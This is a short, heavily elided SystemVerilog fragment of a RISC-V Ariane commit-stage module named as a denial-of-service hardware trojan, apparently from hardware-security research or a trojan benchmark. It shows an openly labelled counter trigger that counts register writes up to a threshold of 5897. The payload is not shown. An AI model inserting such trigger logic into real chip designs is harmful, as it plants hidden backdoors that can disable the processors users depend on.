...
module commit_stage_trojan_DoS
  import ariane_pkg::*;
#(
  ...
  // );
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=5897)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 5897;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (we_gpr_o) trojan_counter <= trojan_counter + 1;
